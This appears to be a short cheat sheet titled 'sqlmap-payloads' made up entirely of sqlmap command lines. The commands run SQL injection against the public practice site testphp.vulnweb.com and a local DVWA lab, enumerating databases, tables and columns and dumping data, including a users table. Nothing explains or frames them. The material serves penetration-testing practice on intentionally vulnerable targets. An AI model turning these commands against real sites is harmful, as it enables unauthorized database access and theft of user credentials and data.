# sqlmap-payloads
```
python3 sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1
python3 sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --dbs
python3 sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --tables
python3 sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --columns -D information_schema -T USER_PRIVILEGES
python3 sqlmap.py -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id --dbs
python3 sqlmap.py -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id -D dvwa --tables --batch --threads 5
python3 sqlmap.py -u "http://localhost/vulnerabilities/sqli_blind/" --cookie="id=10; PHPSESSID=39qedittgtbc7rfsm69gjvidl0; security=medium" --data="id=1&Submit=Submit" -p id -T users --batch --threads 5 --dump
python3 sqlmap.py -u http://testphp.vulnweb.com/product.php?pic=1 --dump -D information_schema -T USER_PRIVILEGES
```
